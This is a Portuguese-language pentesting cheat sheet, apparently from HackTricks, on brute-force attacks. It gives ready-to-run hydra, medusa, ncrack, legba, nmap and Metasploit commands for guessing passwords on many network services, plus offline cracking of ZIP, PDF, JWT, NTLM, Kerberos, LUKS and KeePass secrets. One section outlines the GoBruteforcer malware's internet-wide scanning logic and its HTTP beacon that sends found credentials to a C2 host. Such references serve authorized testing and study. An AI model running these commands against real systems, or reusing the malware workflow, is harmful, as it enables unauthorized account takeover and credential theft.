# Brute Force - Folha de dicas

{{#include ../banners/hacktricks-training.md}}

## Credenciais padrão

**Pesquise no Google** as credenciais padrão da tecnologia utilizada ou **experimente estes links**:

- [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
- [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
- [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
- [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
- [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
- [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
- [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
- [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
- [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
- [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
- [**https://many-passwords.github.io/**](https://many-passwords.github.io)
- [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **Crie seus próprios dicionários**

Encontre o máximo de informações possível sobre o alvo e gere um dicionário personalizado. Ferramentas que podem ajudar:

### Crunch

```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```

### Wordlists baseadas em sites

```bash
# Cewl gets words from the victims page
cewl example.com -m 5 -w words.txt

# Tok (https://github.com/tomnomnom/hacks/tree/master/tok) gets words from a list of URLs
cat /path/to/urls.txt | tok

# https://github.com/m4ll0k/BBTz/blob/master/getjswords.py gets words from a list of JS URLs
cat /path/to/js-urls.txt | python3 getjswords.py
```

### [CUPP](https://github.com/Mebus/cupp)

Gere senhas com base no que você sabe sobre a vítima (nomes, datas...)

```
python3 cupp.py -h
```

### [Wister](https://github.com/cycurity/wister)

Uma ferramenta geradora de listas de palavras que permite fornecer um conjunto de palavras e criar várias combinações a partir delas, gerando uma lista de palavras exclusiva e ideal para um alvo específico.

```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

 __          _______  _____ _______ ______ _____
 \ \        / /_   _|/ ____|__   __|  ____|  __ \
  \ \  /\  / /  | | | (___    | |  | |__  | |__) |
   \ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
    \  /\  /   _| |_ ____) |  | |  | |____| | \ \
     \/  \/   |_____|_____/   |_|  |______|_|  \_\

      Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```

### [pydictor](https://github.com/LandGrey/pydictor)

### Wordlists

- [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
- [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
- [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
- [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
- [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
- [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
- [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
- [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
- [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
- [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

## Fluxo de trabalho de bruteforcer em toda a Internet (lições de scanners baseados em Go)

Os comportamentos a seguir foram observados no fluxo de varredura do malware GoBruteforcer; os valores exatos são específicos da amostra.<sup>[[1]](#references)</sup>

- Mantenha **pools de workers ajustados à arquitetura** (por exemplo, 95 workers simultâneos em `x86_64/arm64`, 85 em `i686`, 35 em `armv5tel` e 50 por padrão em outras arquiteturas), verifique os workers ativos a cada segundo e crie substitutos quando o total ficar abaixo da meta; cada worker lida com, no máximo, um IP de destino antes de sair.
- Gere **IPv4s públicos aleatórios**, mas descarte intervalos obviamente não roteáveis e alguns intervalos que o operador optou por evitar: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, blocos `/8` com alta concentração de serviços em nuvem (`3/15/16/56`) e blocos `/8` associados ao DoD (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
- **Verifique a porta do serviço** com um timeout curto (~2s) antes de tentar **logins em texto simples** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin via HTTP/80) e use uma **pequena lista de credenciais integrada** caso a obtenção de credenciais do C2 falhe.
- **Exfiltre os resultados encontrados** por meio de pequenos beacons HTTP GET, como `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (códigos de serviço como `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`), reutilizando um User-Agent comum de navegador para se misturar ao tráfego normal.
- O **spray de phpMyAdmin** pode testar por força bruta cerca de 80 caminhos prováveis com `GET /index.php?lang=en`, detectar marcadores de PMA (tema `pmahomme`/`phpmyadmin.css`/`navigation.php`) e analisar `codemirror.css?v=X.Y.Z` para escolher o fluxo de autenticação: versões `<4.9` aceitam parâmetros GET `pma_username`/`pma_password`; versões `>=4.9` usam POST com `server=1`, o token CSRF `token` e as mesmas credenciais.

## Serviços

Em ordem alfabética pelo nome do serviço.

### AFP

```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```

### AJP

```bash
nmap --script ajp-brute -p 8009 <IP>
```

### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM e Solace)

```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```

### Cassandra

```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```

### ClickHouse

[bruter](https://github.com/vflame6/bruter)

```bash
bruter clickhouse -u default -p passwords.txt localhost:9000
```

### CouchDB

```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```

### Docker Registry

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```

### Elasticsearch

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```

### FTP

```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```

### HTTP Generic Brute

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP Basic Auth

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```

### HTTP - NTLM

```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```

### HTTP - Formulário POST

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```

Para http**s** você precisa mudar de "http-post-form" para "**https-post-form"

### **HTTP - CMS --** (W)ordpress, (J)oomla ou (D)rupal ou (M)oodle

```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```

### IMAP

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```

### IRC

```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```

### ISCSI

```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```

### JWT

```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```

### LDAP

```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```

### MQTT

```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```

### Mongo

```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```

### MSSQL

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)

```shell
# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
```

```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```

### MySQL

```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```

### OracleSQL

```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```

Para usar **oracle_login** com **patator**, é necessário **instalar**:

```bash
pip3 install cx_Oracle --upgrade
```

[Força bruta offline de hash do OracleSQL](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** and **11.2.0.3**):

```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```

### POP

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```

### PostgreSQL

```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```

### PPTP

Você pode baixar o pacote `.deb` para instalar em [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)

```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```

### RDP

```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```

### Redis

```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```

### Rexec

Para saber como o serviço Rexec autenticado por senha se comporta, consulte [Pentesting Rexec (512/TCP)](../network-services-pentesting/512-pentesting-rexec.md).

```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```

### Rlogin

Para autenticação de hosts confiáveis e acesso ao terminal, consulte [Pentesting Rlogin (513/TCP)](../network-services-pentesting/pentesting-rlogin.md#rlogin-513tcp).

```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```

### Rsh

Para autenticação de hosts confiáveis e comandos remotos, consulte [Pentesting Rsh (514/TCP)](../network-services-pentesting/pentesting-rlogin.md#rsh-514tcp).

```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```

[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```

### RTSP

```bash
hydra -l root -P passwords.txt <IP> rtsp
```

### SFTP

```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```

### SNMP

```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```

### SMB

```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```

### SMPP

```bash
bruter smpp -u smppclient1 -p passwords.txt localhost:2775
```

### SMTP

```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```

### SOCKS

```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```

### SQL Server

```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```

### SSH

```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```

#### Chaves SSH fracas / PRNG previsível do Debian

Alguns sistemas têm falhas conhecidas na semente aleatória usada para gerar material criptográfico. Isso pode resultar em um espaço de chaves drasticamente reduzido, que pode ser atacado por força bruta com ferramentas como [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Também estão disponíveis conjuntos pré-gerados de chaves fracas, como [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### STOMP (ActiveMQ, RabbitMQ, HornetQ e OpenMQ)

O protocolo de texto STOMP é um protocolo de mensagens amplamente usado que **permite comunicação e interação sem complicações com serviços populares de filas de mensagens**, como RabbitMQ, ActiveMQ, HornetQ e OpenMQ. Ele oferece uma abordagem padronizada e eficiente para trocar mensagens e realizar várias operações de mensagens.

```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```

### Telnet

```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
    --username admin \
    --password wordlists/passwords.txt \
    --target localhost:23 \
    --telnet-user-prompt "login: " \
    --telnet-pass-prompt "Password: " \
    --telnet-prompt ":~$ " \
    --single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```

### VNC

```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -p 5900,5901 --script vnc-brute --script-args brute.credfile=wordlist.txt <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```

### Winrm

```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```


## Local

### Bases de dados online de cracking

- [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 com/sem ESS/SSP e com qualquer valor de challenge)
- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, capturas WPA2 e arquivos MSOffice, ZIP, PDF...)
- [https://crackstation.net/](https://crackstation.net) (Hashes)
- [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
- [https://gpuhash.me/](https://gpuhash.me) (Hashes e hashes de arquivos)
- [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
- [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
- [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
- [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
- [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Confira isso antes de tentar fazer brute force de um Hash.

### ZIP

```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```

#### Ataque de ZIP com texto simples conhecido

Use [`bkcrack`](https://github.com/kimci86/bkcrack) contra entradas **ZipCrypto** quando você conhecer pelo menos 12 bytes do fluxo antes da criptografia, incluindo 8 bytes contíguos. Uma entrada armazenada expõe os bytes originais do arquivo como esse fluxo. Para uma entrada DEFLATE, conhecer apenas o arquivo original não é suficiente: o ataque precisa dos bytes compactados correspondentes, que dependem do compressor e das configurações. `bkcrack` recupera as chaves internas; recuperar a senha original é opcional.<sup>[[16]](#references)[[17]](#references)</sup> Consulte [truques de ZIP](../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/zips-tricks.md) para triagem estrutural de ZIP.

```bash
bkcrack -L encrypted.zip  # identify ZipCrypto and Store/Deflate entries
# Stored member: known.txt contains the member's original bytes (or a known prefix).
bkcrack -C encrypted.zip -c entry.txt -p known.txt
# Deflated member: matching.zip must contain the same compressed stream.
bkcrack -C encrypted.zip -c entry.txt -P matching.zip -p entry.txt
# Replace KEY0..KEY2 with the three recovered keys; assumes entries share a password.
bkcrack -C encrypted.zip -k KEY0 KEY1 KEY2 -D decrypted.zip
```

### 7z

```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```

### PDF

```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```

### Senha de proprietário de PDF

Para quebrar uma senha de proprietário de PDF, confira: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT

```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```

### NTLM cracking

```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```

### Keepass

```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

### Keberoasting

```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

### Imagem LUKS

#### Método 1

Instale: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)

```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```

#### Método 2

```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```

Outro tutorial de BF de Luks: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql

```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```

### Chave privada PGP/GPG

```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```

### Cisco

<figure><img src="../images/image (663).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

Use [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) e depois use john

### Coluna protegida por senha do Open Office

Se você tiver um arquivo xlsx com uma coluna protegida por senha, poderá desprotegê-la:

- **Faça upload para o Google Drive** e a senha será removida automaticamente
- Para **removê-la** **manualmente**:

```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```

### Certificados PFX

```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```

## Ferramentas

**Exemplos de hashes:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Hash-identifier

```bash
hash-identifier
> <HASH>
```

### Wordlists

- **Rockyou**
- [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
- [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
